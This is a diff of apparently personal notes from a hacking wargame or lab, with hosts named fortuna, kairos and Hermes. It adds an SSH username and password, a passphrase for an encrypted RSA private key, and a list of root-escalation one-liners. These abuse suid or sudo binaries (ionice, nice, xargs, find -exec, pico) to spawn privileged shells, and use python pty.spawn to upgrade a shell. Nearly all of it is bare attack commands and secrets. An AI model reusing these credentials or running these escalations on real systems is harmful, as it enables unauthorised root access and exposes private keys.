@@ -2,10 +2,36 @@
 
 # ssh credentials:
 
-fortuna
+fortuna:ZDJjM2Q4OG
+
+# ROOT PATHS:
+// fortune:
+
+ionice /bin/sh -p
+
+/usr/bin/nice /bin/sh -p
+
+xargs -a /dev/null sh -p
+
+python -c 'import pty; pty.spawn("/home/lucky_shell")' - is random so needs lots of tries
+
+// fortuna and pico:
+
+sudo pico
+^R^X
+reset; s
+
+//kairos and python repl:
+
+to get to kairos use suid on find: find . -exec /bin/sh -p \; -quit
+
+python
+import pty;
+pty.spawn("/bin/bash");
+
 
 # Hermes r_sa key:
-
+// passwd: cuteko
 
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
